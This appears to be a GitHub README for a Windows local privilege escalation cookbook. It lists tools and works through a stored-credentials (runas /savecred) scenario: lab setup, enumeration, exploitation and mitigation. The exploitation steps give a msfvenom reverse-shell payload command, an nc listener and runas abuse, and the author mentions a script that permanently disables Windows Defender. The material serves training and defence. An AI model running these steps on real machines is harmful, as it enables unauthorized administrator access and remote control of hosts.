# Windows Local Privilege Escalation Cookbook (On Progress)
<p align="center">
  <img src="/Pictures/Windows-Funny.jpg">
</p>

## Description (Keynote)

This CookBook was created with the main purpose of helping people understand local privilege escalation techniques on Windows environments. Moreover, it can be used for both attacking and defensive purposes.

:information_source: This CookBook focuses only on misconfiguration vulnerabilities on Windows workstations/servers/machines.

:warning: Evasion techniques to bypass security protections, endpoints, and antivirus are not included in this cookbook. I created this PowerShell script, [TurnOffAV.ps1](/Lab-Setup-Scripts/TurnOffAV.ps1), which permanently disables Windows Defender. Run this with local Administrator privileges.

The main structure of this CookBook includes the following sections:

- Description (of the vulnerability)
- Lab Setup
- Enumeration
- Exploitation
- Mitigation
- (Useful) References

I hope to find this CookBook useful and learn new stuff 😉.

## Table of Contents

- [Windows Local Privilege Escalation CookBook](#windows-local-privilege-escalation-cookbook)
  - [Description (Keynote)](#description-keynote)
  - [Table of Contents](#table-of-contents)
  - [Useful Tools](#useful-tools)
  - [Vulnerabilities](#vulnerabilities)
  - [References](#references)

## Useful Tools

In the following table, some popular and useful tools for Windows local privilege escalation are presented:

| Name | Language | Description |
| ---- |:-----------:|:-----------:|
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# | SharpUp is a C# port of various PowerUp functionality |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell | PowerUp aims to be a clearinghouse of common Windows privilege escalation |
| [BeRoot](https://github.com/AlessandroZ/BeRoot) | Python | BeRoot(s) is a post exploitation tool to check common Windows misconfigurations to find a way to escalate our privilege |
| [Privesc](https://github.com/enjoiz/Privesc) | PowerShell | Windows PowerShell script that finds misconfiguration issues which can lead to privilege escalation |
| [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) | C# | Windows local Privilege Escalation Awesome Script |

## Vulnerabilities

This CookBook presents the following Windows vulnerabilities:

- [AlwaysInstallElevated](/Notes/AlwaysInstallElevated.md)
- [Logon Autostart Execution (Registry Run Keys)](/Notes/LogonAutostartExecutionRegistryRunKeys.md)
- [Logon Autostart Execution (Startup Folder)](#)
- [Leaked Credentials (PowerShell History)](/Notes/LeakedCredentialsPowerShellHistory.md)
- [Scheduled Task/Job](/Notes/ScheduledTaskJob.md)
- [SeBackupPrivilege](/Notes/SeBackupPrivilege.md)
- [SeImpersonatePrivilege](#)
- [Stored Credentials (Runas)](#stored-credentials-runas)
- [Unquoted Service Path](#)
- [Weak Service Binary Permissions](#)
- [Weak Service Permissions](#)
- [Weak Registry Permissions](#)

## Stored Credentials (Runas)

### Description

The Credentials Manager is a feature in Windows that securely stores usernames and passwords for websites, applications, and network resources. This component is particularly helpful for users who want to manage and retrieve their login information easily without having to remember each set of credentials.

In a scenario where an attacker has compromised an account with access to the Windows Credentials Manager and has obtained stored credentials from an elevated account, he can potentially use the "runas" command to elevate his privileges and gain unauthorized access. 

### Lab Setup

#### Manual Lab Setup

1) Open a command-prompt with local Administrator privileges and create a new user with the following command:

```
net user nickvourd Passw0rd! /add
```

2) Add the new user to Administrator's local group:

```
net localgroup "Administrators" nickvourd /add
```

3) Save credentials to Windows Credentials Manager:

```
runas /savecred /user:WORKGROUP\nickvourd cmd.exe
```

Outcome:

![Stored-Creds-Manual-Lab-Setup](/Pictures/Stored-Creds-Manual-Lab-Set-Up.png)

4) Verify the new stored credentials on Windows Credentials Manager (**Control Panel** > **User Accounts** > **Credential Manager**):

![Stored-Creds-Verify-New-Windows-Creds](/Pictures/Stored-Creds-Control-Panel-4.png)

#### PowerShell Script Lab Setup

Another way to set up the lab with the 'Stored Credentials (Runas)' scenario is by using the custom PowerShell script named [StoredCredentialsRunas.ps1](/Lab-Setup-Scripts/StoredCredentialsRunas.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\StoredCredentialsRunas.ps1
```

:information_source: Please provide the password generated for the `runas` command.

Outcome:

![Stored-Creds-Tool-Lab-Setup](/Pictures/Stored-Creds-Tool-Lab-Set-Up.png)

### Enumeration

To perform enumeration, you can open a command prompt and use the following command to enumerate the stored credentials in the Windows Credentials Manager:

```
cmdkey /list
```

Outcome:

![Stored-Creds-Enum](/Pictures/Stored-Creds-Enum.png)

### Exploitaion

To abuse this scenario you should follow these steps:

1) Create with msfvenom a malicous executable file (i.e., nikos.exe):

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.exe
```

2) Transfer the malicious executable file to victim's machine.

3) open a listener from your attacking machine:

```
nc -lvp 1234
```

4) Grant full access permissions to all users:

```
icacls "C:\Windows\Tasks\nikos.exe" /grant Users:F
```

5) Open a command-prompt with regular user privileges and execute the following command:

```
runas /savecred /user:WORKGROUP\nickvourd "C:\Windows\Tasks\nikos.exe"
```

Outcome:

![Stored-Creds-Exploitation-Victim-Side](/Pictures/Stored-Creds-Explotation-1.png)

6) Verify the new reverse shell from your attacking machine:

![Stored-Creds-Exploitation-Attacker-Side](/Pictures/Stored-Creds-Exploitation-2.png)

### Mitigation

To mitigate stored credentials from Windows Credentials manager. Please follow these steps:

1) Open **Control Panel** and navigate **User Accounts** > **Credential Manager**:

![Stored-Creds-Control-Panel](/Pictures/Stored-Creds-Control-Panel.png)

2) Select **Windows Credentials**, choose your preferred stored credentials, and select the **remove** option:

![Stored-Creds-Remove-Creds](/Pictures/Stored-Creds-Control-Panel-2.png)

3) Select the option "Yes" on the pop-up window:

![Stored-Creds-Remove-Creds-Confirmation](/Pictures/Stored-Creds-Control-Panel-3.png)

4) Verify that the stored credentials have been successfully removed from the Windows Credentials Manager:

![Stored-Creds-Remove-Creds-Verification](/Pictures/Stored-Creds-Control-Panel-5.png)


## References

- [Privilege Escalation Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
- [SharpCollection GitHub by Flangvik](https://github.com/Flangvik/SharpCollection)
- [Metasploit Website](https://www.metasploit.com/)
- [Evil-WinRM GitHub by Hackplayers](https://github.com/Hackplayers/evil-winrm)
- [Windows Privilege Escalation Youtube Playlist by Conda](https://www.youtube.com/watch?v=WWE7VIpgd5I&list=PLDrNMcTNhhYrBNZ_FdtMq-gLFQeUZFzWV&index=13)
- [Interactive Logon Authentication Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-authsod/bfc67803-2c41-4fde-8519-adace79465f6)
